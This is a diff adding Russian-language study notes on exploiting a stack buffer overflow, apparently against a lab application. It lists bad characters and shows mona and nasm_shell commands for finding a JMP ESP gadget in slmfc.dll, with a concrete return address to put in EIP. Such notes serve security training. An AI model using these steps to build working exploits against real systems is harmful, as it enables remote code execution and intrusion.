@@ -27,3 +27,28 @@ badchars = (
 "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0" 
 "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0" 
 "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )
+
+После определения EIP регистра и определения Bad characters, необходимо перенаправить EIP на ESP, используя !mona modules: найти такую библеотеку, которая содержит в себе JMP ESP команду, отсутсвует защита DEP ASLR, нет Bad characters. Перейти к этой библеотеке и попробовать найти этот адрес (search for -> command -> jmp esp), если не нашлось, то можно попробовать найти push esp retn (search for -> sequence of commands -> push esp \r retn).
+Если ничего не нашлось, то не сдавайся ! можно найти что нибудь еще !
+В модуле можно найти библеотеку, которая нам интересна, учитывай, что наша библеотека не защищина ни DEP, ни ASLR, то мы можем воспользоваться:
+
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+
+и найти адрес, указывающий на необходимые нам инструкции (jmp esp)
+
+Ex:
+
+root@kali:~/Scripts# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+nasm > jmp esp
+00000000  FFE4              jmp esp
+nasm > 
+
+теперь нам нужно в ручную найти адрес FFE4 в модуле slmfc.dll
+!mona find -s "\xff\xe4" -m slmfc.dll
+убедится, что адрес не содержит Bad characters.
+и вот он:
+5F4A358F   FFE4             JMP ESP
+теперь прави скрипт и записываем в EIP адрес 5F4A358F, если все сделано правильно, то EIP начнет испольнять все то, что мы поместили в ESP.
+
+
+
